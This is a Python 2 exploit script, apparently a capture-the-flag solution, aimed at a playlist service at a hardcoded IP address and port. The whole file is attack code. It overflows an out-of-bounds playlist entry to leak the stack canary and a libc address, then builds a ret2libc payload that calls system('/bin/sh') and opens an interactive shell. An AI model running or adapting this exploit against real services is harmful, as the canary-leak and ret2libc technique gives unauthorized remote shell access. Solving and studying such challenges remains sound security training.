#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='|\t\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('175.119.158.133', 9091))
f = s.makefile('rw', bufsize=0)

readuntil(f, ' : \n')
f.write('test\n')
readuntil(f)

def create_playlist(f, music, artist):
    f.write('1\n')
    readuntil(f, delim='|\t')
    f.write(music)
    readuntil(f, delim='|\t')
    f.write(artist)
    readuntil(f)

def modify_playlist(f, idx, music, artist):
    f.write('3\n')
    readuntil(f, delim='select number\t|\t')
    f.write(str(idx) + '\n')
    readuntil(f, delim='|\t')
    f.write(music)
    readuntil(f, delim='|\t')
    f.write(artist)
    readuntil(f)

def view_playlist(f):
    f.write('2\n')
    return readuntil(f)

for i in xrange(100):
    print 'creating:', i
    create_playlist(f, 'test', 'test')

modify_playlist(f, 100, 'stack_canary_leak', 'A' * 21)

raw_input()
data = view_playlist(f)
leak = data.split('stack_canary_leak')[1].split('|')[1]
stack_canary = u('\0' + leak[21:21+3])
print 'stack_canary =', hex(stack_canary)

modify_playlist(f, 100, 'libc_leak', 'A' * (20 + 16))
data = view_playlist(f)
leak = data.split('libc_leak')[1].split('|')[1]
libc_addr = u(leak[36:36+4])
print 'libc_addr =', hex(libc_addr)

libc_base  = libc_addr - 0x1873e
print 'libc_base =', hex(libc_base)
system = libc_base + 0x0003b180
binsh = libc_base + 0x15f61b

payload = 'A' * 20
payload += p(stack_canary)
payload += 'B' * 0xc
payload += p(system)
payload += 'C' * 4
payload += p(binsh)
modify_playlist(f, 100, 'payload', payload)

f.write('4\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
